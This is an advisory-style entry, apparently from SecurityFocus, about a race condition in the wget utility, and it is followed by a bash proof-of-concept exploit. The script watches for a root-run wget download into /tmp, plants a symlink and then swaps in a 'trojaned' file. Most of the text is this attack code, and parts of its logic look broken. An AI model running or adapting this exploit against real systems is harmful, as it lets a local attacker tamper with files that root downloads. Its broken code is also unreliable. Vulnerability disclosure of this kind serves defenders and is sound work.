source: http://www.securityfocus.com/bid/10361/info

The 'wget' utility has been reported prone to a race-condition vulnerability. The issue exists because wget doesn't lock files that it creates and writes to during file downloads. 

A local attacker may exploit this condition to corrupt files with the privileges of the victim who is running the vulnerable version of wget.

#!/bin/bash

rm -f salida.txt pid.txt *.wget /tmp/patch-2.4.26.bz2
echo "1">salida.txt
a=`cat salida.txt`
echo "Waiting for Wget execution..."

while [ "$a" == 1 ]
do
   ps auxw|grep wget|grep patch-2.4.26.bz2>>salida.txt
   a=`cat salida.txt`
done

echo "Process catched!"
pgrep -u root wget>pid.txt
ln -s /dev/null /tmp/patch-2.4.26.bz2
echo "/dev/null link created!"
echo "Waiting for downloading to finish..."

b=`pgrep -u root wget`
touch $b.wget
c=1
while [ "$c" == 1 ]
do
  if [ -e .wget ]
  then
    c=0
    echo "Downloading finished! Let's delete the original file, and put our trojaned file :-)"
    rm -f /tmp/patch-2.4.26.bz2
    echo "Surprise!">/tmp/patch-2.4.26.bz2
echo "Does it worked?"

    ls -la /tmp/patch-2.4.26.bz2

  else
  b=`pgrep -u root wget`
  touch $b.wget

  fi

done

